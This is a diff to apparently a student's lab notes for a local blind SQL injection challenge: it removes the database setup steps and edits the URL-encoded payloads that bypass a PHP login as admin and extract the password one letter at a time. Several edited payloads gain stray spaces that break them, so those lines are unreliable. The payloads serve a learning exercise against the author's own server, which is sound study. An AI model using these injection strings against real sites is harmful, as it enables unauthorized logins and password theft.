@@ -27,39 +27,6 @@ sudo systemctl status mysql
 
 log in to mysql ,  sudo mysql
 
-makinf challenge database, 
-CREATE DATABASE sqli_challenge;
-USE sqli_challenge;
-
-making user table , 
-CREATE TABLE users (
-    id VARCHAR(20),
-    pw VARCHAR(50)
-);
-
-the user database is empty , so entering database...
-INSERT INTO users VALUES ('guest', 'guest');
-INSERT INTO users VALUES ('admin', 'SUPERSECRET');
-
-set password policy , 
-SET GLOBAL validate_password.policy=LOW;
-SET GLOBAL validate_password.length=4;
-
-create user , 
-CREATE USER 'teni'@'localhost' IDENTIFIED BY 'teni';
-GRANT ALL PRIVILEGES ON sqli_challenge.* TO 'teni'@'localhost';
-FLUSH PRIVILEGES;
-
-exit , 
-EXIT;
-
-make folder, 
-mkdir ~/blind_sqli
-cd ~/blind_sqli
-
-copy sample.php to this file,
-cp ~/Desktop/challenge_5/sample.php ~/blind_sqli/
-
 start php server,
 php -S 127.0.0.1:8000
 
@@ -77,29 +44,26 @@ use link , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23 , to log
 Finding password letter by letter
 
 Checking first letter of password is "A" , if shows hello guest , admin pass not start with a
-http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27a%25%27%23
+http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27 a %25%27%23
 
 checking for "b", 
-http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27b%25%27%23
+http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27 b %25%27%23
 
-similarliy try for c, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27c%25%27%23
+similarliy try for c, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27 c %25%27%23
 this is how sql injection works.... tyring for oyherr letrters until correct one is obtained...
-   not working upto d , trying letters ,
+   not working upto d , trying letters 
 
-http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%270%25%27%23
-
-trying 1 to 9 one by one, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%271%25%27%23
 
 tryinng upper case , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27A%25%27%23
 
 Got first letter as S, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27S%25%27%23
 
 finding the second letter...
- Got U as the second letter...http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27SU%25%27%23
+ Got U as the second letter...http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27 SU %25%27%23
 
 finding third letter..  
 
-GOT SUP  as third letter , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27SUP%25%27%23
+GOT SUP  as third letter , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27 SUP %25%27%23
 
 got SUPE as 4th .......
 GOT SUPER   ...
